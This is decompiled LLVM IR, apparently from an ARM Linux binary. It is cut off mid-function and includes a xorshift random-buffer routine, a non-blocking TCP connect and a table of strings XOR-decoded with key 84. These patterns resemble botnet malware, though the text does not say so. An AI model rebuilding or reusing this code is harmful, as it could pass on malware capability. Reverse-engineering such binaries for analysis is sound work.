define i32 @function_e24c(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e24c:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e24c = load i32, i32* %r1.global-to-local, align 4
  %v3_e250 = load i32, i32* @r4, align 4
  store i32 %v3_e250, i32* %stack_var_-28, align 4
  %v0_e254 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e254, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e24c, 1
  br i1 %tmp16, label %dec_label_pc_e2fc, label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e24c
  store i32 ptrtoint (i32* @global_var_1e9f0.103 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9ec.107 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9e8.105 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9e4.101 to i32), i32* %r6.global-to-local, align 4
  %v2_e26c = load i32, i32* @global_var_1e9f0.103, align 4
  store i32 %v2_e26c, i32* %lr.global-to-local, align 4
  %v2_e270 = load i32, i32* @global_var_1e9ec.107, align 4
  store i32 %v2_e270, i32* %r4.global-to-local, align 4
  %v2_e274 = load i32, i32* @global_var_1e9e8.105, align 4
  store i32 %v2_e274, i32* %r0.global-to-local, align 4
  %v2_e278 = load i32, i32* @global_var_1e9e4.101, align 4
  br label %dec_label_pc_e29c

dec_label_pc_e280:                                ; preds = %dec_label_pc_e2bc
  %v1_e280 = trunc i32 %v5_e2ac to i16
  %v3_e280 = inttoptr i32 %v9_e2b0 to i16*
  store i16 %v1_e280, i16* %v3_e280, align 2
  %v4_e280 = load i32, i32* %r5.global-to-local, align 4
  %v5_e280 = add i32 %v4_e280, -2
  store i32 %v5_e280, i32* %r5.global-to-local, align 4
  %v0_e284.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e284

dec_label_pc_e284:                                ; preds = %.thread, %dec_label_pc_e280
  %v0_e284 = phi i32 [ %v9_e2b4, %.thread ], [ %v0_e284.pre, %dec_label_pc_e280 ]
  %v2_e2805 = phi i32 [ %v12_e2b0, %.thread ], [ %v5_e280, %dec_label_pc_e280 ]
  %tmp17 = icmp slt i32 %v0_e284, 1
  br i1 %tmp17, label %dec_label_pc_e304, label %dec_label_pc_e290

dec_label_pc_e290:                                ; preds = %dec_label_pc_e284
  %v0_e288 = load i32, i32* %r0.global-to-local, align 4
  %v0_e290 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e290, i32* %r0.global-to-local, align 4
  %v0_e294 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e294, i32* %r4.global-to-local, align 4
  %v0_e298 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e298, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e29c

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e25c, %dec_label_pc_e290
  %v0_e2e8 = phi i32 [ %v2_e274, %dec_label_pc_e25c ], [ %v0_e290, %dec_label_pc_e290 ]
  %v9_e2b0 = phi i32 [ %v0_e254, %dec_label_pc_e25c ], [ %v2_e2805, %dec_label_pc_e290 ]
  %v0_e2c8 = phi i32 [ %v0_e24c, %dec_label_pc_e25c ], [ %v0_e284, %dec_label_pc_e290 ]
  %v0_e2dc = phi i32 [ %v2_e26c, %dec_label_pc_e25c ], [ %v0_e298, %dec_label_pc_e290 ]
  %v0_e2d8 = phi i32 [ %v2_e278, %dec_label_pc_e25c ], [ %v0_e288, %dec_label_pc_e290 ]
  %v4_e29c = mul i32 %v0_e2d8, 2048
  %v5_e29c = xor i32 %v4_e29c, %v0_e2d8
  %v4_e2a0 = udiv i32 %v0_e2dc, 524288
  %v5_e2a0 = xor i32 %v4_e2a0, %v0_e2dc
  %v2_e2a4 = xor i32 %v5_e2a0, %v5_e29c
  %v4_e2ac = udiv i32 %v5_e29c, 256
  %v5_e2ac = xor i32 %v2_e2a4, %v4_e2ac
  store i32 %v5_e2ac, i32* %r3.global-to-local, align 4
  %v7_e2b0 = icmp sgt i32 %v0_e2c8, 3
  br i1 %v7_e2b0, label %.thread, label %dec_label_pc_e2bc

.thread:                                          ; preds = %dec_label_pc_e29c
  %v10_e2b0 = inttoptr i32 %v9_e2b0 to i32*
  store i32 %v5_e2ac, i32* %v10_e2b0, align 4
  %v11_e2b0 = load i32, i32* %r5.global-to-local, align 4
  %v12_e2b0 = add i32 %v11_e2b0, 4
  store i32 %v12_e2b0, i32* %r5.global-to-local, align 4
  %v8_e2b4 = load i32, i32* %r1.global-to-local, align 4
  %v9_e2b4 = add i32 %v8_e2b4, -4
  store i32 %v9_e2b4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e284

dec_label_pc_e2bc:                                ; preds = %dec_label_pc_e29c
  %v7_e2c8 = icmp eq i32 %v0_e2c8, 1
  store i32 %v5_e2ac, i32* %r3.global-to-local, align 4
  %v1_e2d0 = add i32 %v0_e2c8, -2
  store i32 %v1_e2d0, i32* %r1.global-to-local, align 4
  br i1 %v7_e2c8, label %dec_label_pc_e2d8, label %dec_label_pc_e280

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2bc
  store i32 %v5_e2ac, i32* %r3.global-to-local, align 4
  %v1_e2e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2e8 = inttoptr i32 %v1_e2e8 to i32*
  store i32 %v0_e2e8, i32* %v2_e2e8, align 4
  %v0_e2ec = load i32, i32* %r4.global-to-local, align 4
  %v1_e2ec = load i32, i32* %r7.global-to-local, align 4
  %v2_e2ec = inttoptr i32 %v1_e2ec to i32*
  store i32 %v0_e2ec, i32* %v2_e2ec, align 4
  %v0_e2f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e2f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_e2f0 = inttoptr i32 %v1_e2f0 to i32*
  store i32 %v0_e2f0, i32* %v2_e2f0, align 4
  %v0_e2f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2f4 = load i32, i32* %sl.global-to-local, align 4
  %v2_e2f4 = inttoptr i32 %v1_e2f4 to i32*
  store i32 %v0_e2f4, i32* %v2_e2f4, align 4
  %v0_e2f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2f8 = trunc i32 %v0_e2f8 to i8
  %v2_e2f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_e2f8 = inttoptr i32 %v2_e2f8 to i8*
  store i8 %v1_e2f8, i8* %v3_e2f8, align 1
  br label %dec_label_pc_e2fc

dec_label_pc_e2fc:                                ; preds = %dec_label_pc_e24c, %dec_label_pc_e304, %dec_label_pc_e2d8
  %v2_e2fc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e2fc, i32* @r4, align 4
  %v1_e300 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e300

dec_label_pc_e304:                                ; preds = %dec_label_pc_e284
  %v0_e304 = load i32, i32* %r3.global-to-local, align 4
  %v1_e304 = load i32, i32* %sl.global-to-local, align 4
  %v2_e304 = inttoptr i32 %v1_e304 to i32*
  store i32 %v0_e304, i32* %v2_e304, align 4
  %v0_e308 = load i32, i32* %lr.global-to-local, align 4
  %v1_e308 = load i32, i32* %r8.global-to-local, align 4
  %v2_e308 = inttoptr i32 %v1_e308 to i32*
  store i32 %v0_e308, i32* %v2_e308, align 4
  %v0_e30c = load i32, i32* %r4.global-to-local, align 4
  %v1_e30c = load i32, i32* %r7.global-to-local, align 4
  %v2_e30c = inttoptr i32 %v1_e30c to i32*
  store i32 %v0_e30c, i32* %v2_e30c, align 4
  %v0_e310 = load i32, i32* %r0.global-to-local, align 4
  %v1_e310 = load i32, i32* %r6.global-to-local, align 4
  %v2_e310 = inttoptr i32 %v1_e310 to i32*
  store i32 %v0_e310, i32* %v2_e310, align 4
  br label %dec_label_pc_e2fc

; uselistorder directives
  uselistorder i32 %v9_e2b4, { 1, 0 }
  uselistorder i32 %v12_e2b0, { 1, 0 }
  uselistorder i32 %v5_e2ac, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e2d8, { 1, 0 }
  uselistorder i32 %v0_e2dc, { 1, 0 }
  uselistorder i32 %v0_e2c8, { 1, 0, 2 }
  uselistorder i32 %v0_e284, { 1, 0 }
  uselistorder i32 %v0_e24c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1e9e4.101, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1e9e4.101 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_1e9e8.105, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_1e9ec.107, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1e9f0.103, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e2fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e29c, { 1, 0 }
}

define i32 @function_e328() local_unnamed_addr {
dec_label_pc_e328:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e328 = load i32, i32* @r4, align 4
  store i32 %v3_e328, i32* %stack_var_-16, align 4
  %v12_e328 = load i32, i32* @lr, align 4
  %v0_e32c = load i32, i32* @r0, align 4
  store i32 %v0_e32c, i32* %r5.global-to-local, align 4
  %v1_e330 = add i32 %v0_e32c, 4
  %v2_e330 = inttoptr i32 %v1_e330 to i32*
  %v3_e330 = load i32, i32* %v2_e330, align 4
  store i32 %v3_e330, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 58196, i32* @lr, align 4
  %v1_e350 = icmp ne i32 %v3_e330, -1
  call void @__pseudo_cond_branch(i1 %v1_e350, i32 ptrtoint (i32* @global_var_10ddc.95 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e360 = call i32 @function_115f4(i32 2, i32 1, i32 0)
  store i32 %v3_e360, i32* %r0.global-to-local, align 4
  %v7_e364 = icmp eq i32 %v3_e360, -1
  %v1_e368 = load i32, i32* %r5.global-to-local, align 4
  %v2_e368 = add i32 %v1_e368, 4
  %v3_e368 = inttoptr i32 %v2_e368 to i32*
  store i32 %v3_e360, i32* %v3_e368, align 4
  br i1 %v7_e364, label %dec_label_pc_e328.dec_label_pc_e3e0_crit_edge, label %dec_label_pc_e370

dec_label_pc_e328.dec_label_pc_e3e0_crit_edge:    ; preds = %dec_label_pc_e328
  %v1_e3e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3e0

dec_label_pc_e370:                                ; preds = %dec_label_pc_e328
  %v2_e334 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e370 = load i32, i32* %r5.global-to-local, align 4
  %v1_e370 = add i32 %v0_e370, 28
  store i32 %v1_e370, i32* @r0, align 4
  %v0_e374 = load i32, i32* %r6.global-to-local, align 4
  %v2_e374 = add i32 %v0_e370, 24
  %v3_e374 = inttoptr i32 %v2_e374 to i32*
  store i32 %v0_e374, i32* %v3_e374, align 4
  store i32 256, i32* @r1, align 4
  %v0_e37c = call i32 @function_103b0()
  store i32 %v0_e37c, i32* %r0.global-to-local, align 4
  %v0_e380 = load i32, i32* %r5.global-to-local, align 4
  %v1_e380 = add i32 %v0_e380, 4
  %v2_e380 = inttoptr i32 %v1_e380 to i32*
  %v3_e380 = load i32, i32* %v2_e380, align 4
  store i32 %v3_e380, i32* %r4.global-to-local, align 4
  %v0_e384 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e384, i32* %r2.global-to-local, align 4
  store i32 %v3_e380, i32* %r0.global-to-local, align 4
  %v2_e390 = call i32 @function_10c10(i32 %v3_e380, i32 3)
  %v1_e398 = or i32 %v2_e390, 2048
  store i32 %v1_e398, i32* %r2.global-to-local, align 4
  %v0_e39c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e39c, i32* %r0.global-to-local, align 4
  %v2_e3a0 = call i32 @function_10c10(i32 %v0_e39c, i32 4)
  store i32 %v2_e3a0, i32* %r0.global-to-local, align 4
  %v2_e3a8 = load i32, i32* @global_var_1ea28.121, align 4
  store i32 %v2_e3a8, i32* %r2.global-to-local, align 4
  %v1_e3b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_e3b0 = add i32 %v1_e3b0, 12
  %v3_e3b0 = inttoptr i32 %v2_e3b0 to i32*
  store i32 1, i32* %v3_e3b0, align 4
  store i32 2, i32* @r3, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e3bc = load i32, i32* %r2.global-to-local, align 4
  %v1_e3bc = load i32, i32* %r5.global-to-local, align 4
  %v2_e3bc = add i32 %v1_e3bc, 8
  %v3_e3bc = inttoptr i32 %v2_e3bc to i32*
  store i32 %v0_e3bc, i32* %v3_e3bc, align 4
  %v0_e3c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_e3c0 = add i32 %v0_e3c0, 16
  %v2_e3c0 = inttoptr i32 %v1_e3c0 to i32*
  %v3_e3c0 = load i32, i32* %v2_e3c0, align 4
  store i32 %v3_e3c0, i32* @ip, align 4
  %v1_e3c4 = add i32 %v0_e3c0, 4
  %v2_e3c4 = inttoptr i32 %v1_e3c4 to i32*
  %v3_e3c4 = load i32, i32* %v2_e3c4, align 4
  store i32 %v3_e3c4, i32* %r0.global-to-local, align 4
  %v1_e3c8 = add i32 %v0_e3c0, 20
  %v2_e3c8 = inttoptr i32 %v1_e3c8 to i16*
  %v3_e3c8 = load i16, i16* %v2_e3c8, align 2
  %v4_e3c8 = zext i16 %v3_e3c8 to i32
  store i32 %v4_e3c8, i32* %r5.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e3dc = call i32 @function_113dc(i32 %v3_e3c4, i32 %v2_e334, i32 16)
  store i32 %v3_e3dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3e0

dec_label_pc_e3e0:                                ; preds = %dec_label_pc_e328.dec_label_pc_e3e0_crit_edge, %dec_label_pc_e370
  %v1_e3e8 = phi i32 [ %v1_e3e8.pre, %dec_label_pc_e328.dec_label_pc_e3e0_crit_edge ], [ %v3_e3dc, %dec_label_pc_e370 ]
  %v2_e3e4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e3e4, i32* @r4, align 4
  store i32 %v12_e328, i32* @lr, align 4
  ret i32 %v1_e3e8

; uselistorder directives
  uselistorder i32 %v3_e360, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @function_103b0, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e3e0, { 1, 0 }
}

define i32 @function_e3f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e3f0:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e3f0 = load i32, i32* @r4, align 4
  %v6_e3f0 = load i32, i32* @r5, align 4
  %v9_e3f0 = load i32, i32* @r6, align 4
  %v12_e3f0 = load i32, i32* @r7, align 4
  %v15_e3f0 = load i32, i32* @r8, align 4
  %v18_e3f0 = load i32, i32* @sb, align 4
  %v21_e3f0 = load i32, i32* @sl, align 4
  %v24_e3f0 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_1e9f4.123 to i32), i32* @fp, align 4
  %v2_e3f8 = load i32, i32* @global_var_1e9f4.123, align 4
  store i32 ptrtoint (i32* @global_var_1ea20.125 to i32), i32* @sl, align 4
  %v1_e404 = add i32 %v2_e3f8, 1
  store i32 %v1_e404, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e410 = load i32, i32* @global_var_1ea20.125, align 4
  store i32 %v2_e410, i32* %r0.global-to-local, align 4
  %v3_e414 = mul i32 %v1_e404, 16
  store i32 %v3_e414, i32* %r1.global-to-local, align 4
  %v4_e41c = inttoptr i32 %v2_e410 to i32*
  %v5_e41c = call i32 @function_12290(i32* %v4_e41c, i32 %v3_e414, i32 %arg3, i32 %v1_e404)
  %v2_e420 = load i32, i32* @global_var_1e9f4.123, align 4
  store i32 %v2_e420, i32* %r2.global-to-local, align 4
  store i32 %v5_e41c, i32* @r8, align 4
  %v0_e428 = load i32, i32* @r5, align 4
  store i32 %v0_e428, i32* %r0.global-to-local, align 4
  %v1_e430 = load i32, i32* @sl, align 4
  %v2_e430 = inttoptr i32 %v1_e430 to i32*
  store i32 %v5_e41c, i32* %v2_e430, align 4
  %v1_e434 = inttoptr i32 %v0_e428 to i8*
  %v2_e434 = call i32 @function_1031c(i8* %v1_e434)
  %sext = mul i32 %v2_e434, 16777216
  %v1_e438 = sdiv i32 %sext, 16777216
  %v2_e438 = add nsw i32 %v1_e438, 1
  store i32 %v2_e438, i32* @r4, align 4
  store i32 %v1_e438, i32* @r7, align 4
  store i32 %v2_e438, i32* @r0, align 4
  %v0_e444 = call i32 @function_1183c()
  store i32 %v0_e444, i32* %r0.global-to-local, align 4
  %v0_e448 = load i32, i32* @r5, align 4
  store i32 %v0_e448, i32* %r1.global-to-local, align 4
  %v0_e44c = load i32, i32* @r4, align 4
  store i32 %v0_e44c, i32* %r2.global-to-local, align 4
  store i32 %v0_e444, i32* %r6.global-to-local, align 4
  %v3_e454 = call i32 @function_1038c(i32 %v0_e444, i32 %v0_e448, i32 %v0_e44c)
  store i32 %v3_e454, i32* %r0.global-to-local, align 4
  %v0_e458 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e458, 1
  %extract.t6 = trunc i32 %v0_e458 to i8
  br i1 %tmp22, label %dec_label_pc_e47c, label %dec_label_pc_e460

dec_label_pc_e460:                                ; preds = %dec_label_pc_e3f0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e464

dec_label_pc_e464:                                ; preds = %dec_label_pc_e464, %dec_label_pc_e460
  %v2_e46c = phi i32 [ %v1_e470, %dec_label_pc_e464 ], [ 0, %dec_label_pc_e460 ]
  %v1_e464 = load i32, i32* %r6.global-to-local, align 4
  %v2_e464 = add i32 %v1_e464, %v2_e46c
  %v3_e464 = inttoptr i32 %v2_e464 to i8*
  %v4_e464 = load i8, i8* %v3_e464, align 1
  %v6_e464 = zext i8 %v4_e464 to i32
  %v1_e468 = xor i32 %v6_e464, 84
  store i32 %v1_e468, i32* %r3.global-to-local, align 4
  %v1_e46c = trunc i32 %v1_e468 to i8
  store i8 %v1_e46c, i8* %v3_e464, align 1
  %v0_e470 = load i32, i32* %r2.global-to-local, align 4
  %v1_e470 = add i32 %v0_e470, 1
  store i32 %v1_e470, i32* %r2.global-to-local, align 4
  %v1_e474 = load i32, i32* @r7, align 4
  %v9_e474 = icmp eq i32 %v1_e470, %v1_e474
  br i1 %v9_e474, label %dec_label_pc_e47c.loopexit, label %dec_label_pc_e464

dec_label_pc_e47c.loopexit:                       ; preds = %dec_label_pc_e464
  %extract.t = trunc i32 %v1_e470 to i8
  br label %dec_label_pc_e47c

dec_label_pc_e47c:                                ; preds = %dec_label_pc_e47c.loopexit, %dec_label_pc_e3f0
  %v0_e48c.off0 = phi i8 [ %extract.t, %dec_label_pc_e47c.loopexit ], [ %extract.t6, %dec_label_pc_e3f0 ]
  %v2_e47c = load i32, i32* @global_var_1e9f4.123, align 4
  %v2_e480 = load i32, i32* @global_var_1ea20.125, align 4
  %v3_e484 = mul i32 %v2_e47c, 16
  store i32 %v3_e484, i32* @sb, align 4
  %v2_e488 = add i32 %v2_e480, %v3_e484
  store i32 %v2_e488, i32* %r2.global-to-local, align 4
  %v3_e48c = add i32 %v2_e488, 12
  %v4_e48c = inttoptr i32 %v3_e48c to i8*
  store i8 %v0_e48c.off0, i8* %v4_e48c, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e420, i32* %r3.global-to-local, align 4
  %v0_e498 = load i32, i32* %r6.global-to-local, align 4
  %v1_e498 = load i32, i32* @r8, align 4
  %v5_e498 = mul i32 %v2_e420, 16
  %v6_e498 = add i32 %v1_e498, %v5_e498
  %v7_e498 = inttoptr i32 %v6_e498 to i32*
  store i32 %v0_e498, i32* %v7_e498, align 4
  %v2_e49c = load i32, i32* @global_var_1ea20.125, align 4
  store i32 %v2_e49c, i32* @r7, align 4
  %v1_e4a0 = inttoptr i32 %arg2 to i8*
  %v2_e4a0 = call i32 @function_1031c(i8* %v1_e4a0)
  %sext1 = mul i32 %v2_e4a0, 16777216
  %v1_e4a4 = sdiv i32 %sext1, 16777216
  %v2_e4a4 = add nsw i32 %v1_e4a4, 1
  store i32 %v2_e4a4, i32* @r4, align 4
  store i32 %v1_e4a4, i32* @r6, align 4
  store i32 %v2_e4a4, i32* @r0, align 4
  %v0_e4b0 = call i32 @function_1183c()
  store i32 %v0_e4b0, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e4b8 = load i32, i32* @r4, align 4
  store i32 %v0_e4b8, i32* %r2.global-to-local, align 4
  store i32 %v0_e4b0, i32* %r5.global-to-local, align 4
  %v3_e4c0 = call i32 @function_1038c(i32 %v0_e4b0, i32 %arg2, i32 %v0_e4b8)
  store i32 %v3_e4c0, i32* %r0.global-to-local, align 4
  %v0_e4c4 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e4c4, 1
  %extract.t8 = trunc i32 %v0_e4c4 to i8
  br i1 %tmp23, label %dec_label_pc_e4e8, label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e47c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e4d0

dec_label_pc_e4d0:                                ; preds = %dec_label_pc_e4d0, %dec_label_pc_e4cc
  %v2_e4d8 = phi i32 [ %v1_e4dc, %dec_label_pc_e4d0 ], [ 0, %dec_label_pc_e4cc ]
  %v1_e4d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_e4d0 = add i32 %v1_e4d0, %v2_e4d8
  %v3_e4d0 = inttoptr i32 %v2_e4d0 to i8*
  %v4_e4d0 = load i8, i8* %v3_e4d0, align 1
  %v6_e4d0 = zext i8 %v4_e4d0 to i32
  %v1_e4d4 = xor i32 %v6_e4d0, 84
  store i32 %v1_e4d4, i32* %r3.global-to-local, align 4
  %v1_e4d8 = trunc i32 %v1_e4d4 to i8
  store i8 %v1_e4d8, i8* %v3_e4d0, align 1
  %v0_e4dc = load i32, i32* %r2.global-to-local, align 4
  %v1_e4dc = add i32 %v0_e4dc, 1
  store i32 %v1_e4dc, i32* %r2.global-to-local, align 4
  %v1_e4e0 = load i32, i32* @r6, align 4
  %v9_e4e0 = icmp eq i32 %v1_e4dc, %v1_e4e0
  br i1 %v9_e4e0, label %dec_label_pc_e4e8.loopexit, label %dec_label_pc_e4d0

dec_label_pc_e4e8.loopexit:                       ; preds = %dec_label_pc_e4d0
  %extract.t7 = trunc i32 %v1_e4dc to i8
  br label %dec_label_pc_e4e8

dec_label_pc_e4e8:                                ; preds = %dec_label_pc_e4e8.loopexit, %dec_label_pc_e47c
  %v0_e4f8.off0 = phi i8 [ %extract.t7, %dec_label_pc_e4e8.loopexit ], [ %extract.t8, %dec_label_pc_e47c ]
  %v2_e4e8 = load i32, i32* @global_var_1e9f4.123, align 4
  store i32 %v2_e4e8, i32* %r0.global-to-local, align 4
  %v2_e4ec = load i32, i32* @global_var_1ea20.125, align 4
  %v3_e4f0 = mul i32 %v2_e4e8, 16
  store i32 %v3_e4f0, i32* %r1.global-to-local, align 4
  %v2_e4f4 = or i32 %v3_e4f0, 13
  %v3_e4f8 = add i32 %v2_e4f4, %v2_e4ec
  %v4_e4f8 = inttoptr i32 %v3_e4f8 to i8*
  store i8 %v0_e4f8.off0, i8* %v4_e4f8, align 1
  store i32 ptrtoint (i16** @global_var_1ea24.127 to i32), i32* %r4.global-to-local, align 4
  %v2_e504 = load i16, i16* bitcast (i16** @global_var_1ea24.127 to i16*), align 4
  %v3_e504 = zext i16 %v2_e504 to i32
  store i32 %v3_e504, i32* %lr.global-to-local, align 4
  %v2_e50c = load i32, i32* @global_var_1ea20.125, align 4
  store i32 %v2_e50c, i32* %r2.global-to-local, align 4
  %v0_e514 = load i32, i32* %r1.global-to-local, align 4
  %v2_e514 = add i32 %v0_e514, %v2_e50c
  store i32 %v2_e514, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_1ea24.127 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e51c = load i32, i32* @sb, align 4
  %v1_e51c = load i32, i32* @r7, align 4
  %v2_e51c = add i32 %v1_e51c, %v0_e51c
  store i32 %v2_e51c, i32* %ip.global-to-local, align 4
  %v0_e520 = load i32, i32* %r0.global-to-local, align 4
  %v1_e520 = add i32 %v0_e520, 1
  store i32 %v1_e520, i32* %r0.global-to-local, align 4
  %v3_e524 = add i32 %v2_e514, 10
  %v4_e524 = inttoptr i32 %v3_e524 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_1ea24.127 to i32), i32 16), i32 16) to i16), i16* %v4_e524, align 2
  %v0_e528 = load i32, i32* %lr.global-to-local, align 4
  %v1_e528 = trunc i32 %v0_e528 to i16
  %v2_e528 = load i32, i32* %r1.global-to-local, align 4
  %v3_e528 = add i32 %v2_e528, 8
  %v4_e528 = inttoptr i32 %v3_e528 to i16*
  store i16 %v1_e528, i16* %v4_e528, align 2
  %v0_e52c = load i32, i32* %r5.global-to-local, align 4
  %v1_e52c = load i32, i32* %ip.global-to-local, align 4
  %v2_e52c = add i32 %v1_e52c, 4
  %v3_e52c = inttoptr i32 %v2_e52c to i32*
  store i32 %v0_e52c, i32* %v3_e52c, align 4
  %v1_e530 = load i32, i32* @fp, align 4
  %v2_e530 = inttoptr i32 %v1_e530 to i32*
  store i32 %v1_e520, i32* %v2_e530, align 4
  %v0_e534 = load i32, i32* %r3.global-to-local, align 4
  %v1_e534 = trunc i32 %v0_e534 to i16
  %v2_e534 = load i32, i32* %r4.global-to-local, align 4
  %v3_e534 = inttoptr i32 %v2_e534 to i16*
  store i16 %v1_e534, i16* %v3_e534, align 2
  store i32 %v3_e3f0, i32* @r4, align 4
  store i32 %v6_e3f0, i32* @r5, align 4
  store i32 %v9_e3f0, i32* @r6, align 4
  store i32 %v12_e3f0, i32* @r7, align 4
  store i32 %v15_e3f0, i32* @r8, align 4
  store i32 %v18_e3f0, i32* @sb, align 4
  store i32 %v21_e3f0, i32* @sl, align 4
  store i32 %v24_e3f0, i32* @fp, align 4
  ret i32 %v1_e520

; uselistorder directives
  uselistorder i32 %v3_e4f0, { 1, 0 }
  uselistorder i32 %v1_e4dc, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e4b0, { 1, 0, 2 }
  uselistorder i32 %v3_e484, { 1, 0 }
  uselistorder i32 %v1_e470, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e444, { 1, 0, 2 }
  uselistorder i32 %v2_e420, { 1, 0, 2 }
  uselistorder i32 %v3_e414, { 1, 0 }
  uselistorder i32 %v1_e404, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @function_1031c, { 0, 1, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @function_e550(i32 %arg1) local_unnamed_addr {
dec_label_pc_e550:
